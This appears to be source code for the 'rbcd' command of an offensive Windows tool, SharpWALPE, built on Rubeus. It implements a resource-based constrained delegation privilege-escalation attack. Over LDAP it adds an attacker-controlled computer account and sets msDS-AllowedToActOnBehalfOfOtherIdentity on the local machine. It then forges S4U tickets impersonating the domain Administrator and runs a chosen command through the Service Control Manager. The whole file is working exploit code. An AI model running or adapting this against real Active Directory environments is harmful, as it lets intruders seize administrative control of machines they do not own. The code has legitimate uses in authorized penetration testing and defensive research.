using Mono.Options;
using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.Protocols;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Xml.Linq;

namespace SharpWALPE.Commands
{
    public class Rbcd : Command
    {
        static string cmd_name = "rbcd";
        private string lastArgs = "";
        public Rbcd() : base(cmd_name, string.Format("Resource-based Constrained Delegation.\n- Usage: {0} {1} -h (for more detail)", Program.appName, cmd_name))
        {
            Options = new OptionSet()
            {
                "",
                string.Format("Usage: {0} {1} [OPTIONS]", Program.appName, Name),
                "",
                "Options:",
                { "m=|computer", "(Required) The new computer account to create.", v => {Arg_ComputerName = v; lastArgs = "m"; } },
                { "p=|password", "(Required) The password of the new computer account to be created.", v => {Arg_ComputerPassword = v; lastArgs = "p"; } },
                { "d=|domain", "Domain (FQDN) to authenticate to.", v => {Arg_Domain = v; lastArgs = "d"; } },
                { "s=|server", "Host name of domain controller or LDAP server.", v => {Arg_DomainController = v; lastArgs = "s";} },
                { "c=|command", "Program to run.", v => {Arg_Command = v; lastArgs = "c"; } },
                { "help|h|?", "Show this message and exit.", v => ShowHelp = v != null },
                { "<>", v => {
                    switch (lastArgs)
                    {
                        case "c":
                            Arg_Command += " " + v;
                            break;
                    }
                } },
            };
        }

        public bool ShowHelp { get; private set; }

        public string Arg_Domain { get; private set; }
        public string Arg_DomainController { get; private set; }
        public string Arg_ComputerName { get; private set; }
        public string Arg_ComputerPassword { get; private set; }
        public string Arg_Command { get; private set; }
        public bool Arg_Cleanup { get; private set; }

        public override int Invoke(IEnumerable<string> args)
        {
            try
            {
                var extra = Options.Parse(args);
                if (ShowHelp || (string.IsNullOrEmpty(Arg_ComputerName) || string.IsNullOrEmpty(Arg_ComputerPassword)))
                {
                    Options.WriteOptionDescriptions(CommandSet.Out);
                    return 1;
                }

                if (string.IsNullOrEmpty(Arg_Domain))
                {
                    Arg_Domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name.ToLower();
                }

                if (string.IsNullOrEmpty(Arg_DomainController))
                {
                    Arg_DomainController = Rubeus.Networking.GetDCName();
                }

                Rubeus.Config.WrapTickets = Program.wrapTickets;
                Rubeus.Config.Show = Program.verbosity;
                //Rubeus.Config.AsnDebug = Program.verbosity;
                string targetComputerName = Environment.MachineName;
                Execute(targetComputerName, Arg_Domain, Arg_DomainController, 389, Arg_ComputerName, Arg_ComputerPassword);
                System.Threading.Thread.Sleep(1500);
                return KrbSCM.Execute(Arg_Command);
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("commands: {0}", Program.verbosity ? e.ToString() : e.Message);
                return 1;
            }
        }

        public static string RootDN;
        public static string ComputersDN;
        public static string NewComputersDN;
        public static string TargetComputerDN;

        public static void Execute(string targetComputerName, string domain, string domainController, int port, string computerName, string computerPassword)
        {
            string targetUser = $"{domain}\\Administrator";
            string targetSPN = $"HOST/{targetComputerName}";
            string computerHash = "";
            Rubeus.Interop.KERB_ETYPE encType = Rubeus.Interop.KERB_ETYPE.rc4_hmac; // throwaway placeholder, changed to something valid

            if (Program.verbosity) Console.WriteLine("[*] Action: AllowedToAct\r\n");

            SecurityIdentifier securityIdentifier = null;
            LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(domainController, port);
            LdapConnection connection = new LdapConnection(identifier);

            if (connection != null)
            {
                connection.SessionOptions.Sealing = true;
                connection.SessionOptions.Signing = true;
                connection.Bind();

                foreach (string DC in domain.Split('.'))
                {
                    RootDN += ",DC = " + DC;
                }

                RootDN = RootDN.TrimStart(',');
                ComputersDN = "CN=Computers," + RootDN;
                NewComputersDN = $"CN={computerName}," + ComputersDN;
                TargetComputerDN = $"CN={targetComputerName}," + ComputersDN;

                DirectoryEntry entry = Ldap.LocateAccount(computerName + "$", domain, domainController);
                if (entry != null)
                {
                    Console.WriteLine("[*] The computer account already exists.");
                    try
                    {
                        securityIdentifier = new SecurityIdentifier(entry.Properties["objectSid"][0] as byte[], 0);
                        Console.WriteLine($"[*] Sid of the new computer account: {securityIdentifier.Value}");
                    }
                    catch
                    {
                        Console.WriteLine("[-] Can not retrieve the sid");
                    }
                }
                else
                {
                    AddRequest addRequest = new AddRequest(NewComputersDN, new DirectoryAttribute[] {
                        new DirectoryAttribute("DnsHostName", computerName + "." + domain),
                        new DirectoryAttribute("SamAccountName", computerName + "$"),
                        new DirectoryAttribute("userAccountControl", "4096"),
                        new DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes("\"" + computerPassword + "\"")),
                        new DirectoryAttribute("objectClass", "Computer"),
                        new DirectoryAttribute("ServicePrincipalName", "HOST/" + computerName + "." + domain, "RestrictedKrbHost/" + computerName + "." + domain, "HOST/" + computerName, "RestrictedKrbHost/" + computerName)
                    });

                    try
                    {
                        connection.SendRequest(addRequest);
                        Console.WriteLine($"[*] Computer account {computerName}$ added with password {computerPassword}.");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-]", ex.ToString());
                        Console.WriteLine("[-] The new computer could not be created! User may have reached ms-DS-ComputerAccountQuota limit");
                    }

                    // Get SID of the new computer object
                    entry = Ldap.LocateAccount(computerName + "$", domain, domainController);
                    if (entry != null)
                    {
                        try
                        {
                            securityIdentifier = new SecurityIdentifier(entry.Properties["objectSid"][0] as byte[], 0);
                            Console.WriteLine($"[*] Sid of the new computer account: {securityIdentifier.Value}");
                        }
                        catch
                        {
                            Console.WriteLine("[-] Can not retrieve the sid");
                        }
                    }
                }

                string nTSecurityDescriptor = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + securityIdentifier + ")";
                RawSecurityDescriptor rawSecurityIdentifier = new RawSecurityDescriptor(nTSecurityDescriptor);
                byte[] descriptorBuffer = new byte[rawSecurityIdentifier.BinaryLength];
                rawSecurityIdentifier.GetBinaryForm(descriptorBuffer, 0);

                ModifyRequest modifyRequest = new ModifyRequest(TargetComputerDN, DirectoryAttributeOperation.Replace, "msDS-AllowedToActOnBehalfOfOtherIdentity", descriptorBuffer);
                try
                {
                    ModifyResponse modifyResponse = (ModifyResponse)connection.SendRequest(modifyRequest);
                    Console.WriteLine($"[*] {computerName}$ can now impersonate users on {TargetComputerDN} via S4U2Proxy");
                    if (Program.verbosity) Console.WriteLine();
                }
                catch
                {
                    Console.WriteLine("[-] Could not modify attribute msDS-AllowedToActOnBehalfOfOtherIdentity, check that your user has sufficient rights");
                }

            }

            if (!string.IsNullOrEmpty(computerPassword))
            {
                string salt = string.Format("{0}host{1}.{2}", domain.ToUpper(), computerName.TrimEnd('$').ToLower(), domain.ToLower());
                computerHash = Rubeus.Crypto.KerberosPasswordHash(encType, computerPassword, salt);
            }
            Rubeus.S4U.Execute(computerName, domain, computerHash, encType, targetUser, targetSPN, ptt: true, domainController: domainController, show: Program.verbosity);
        }
    }
}
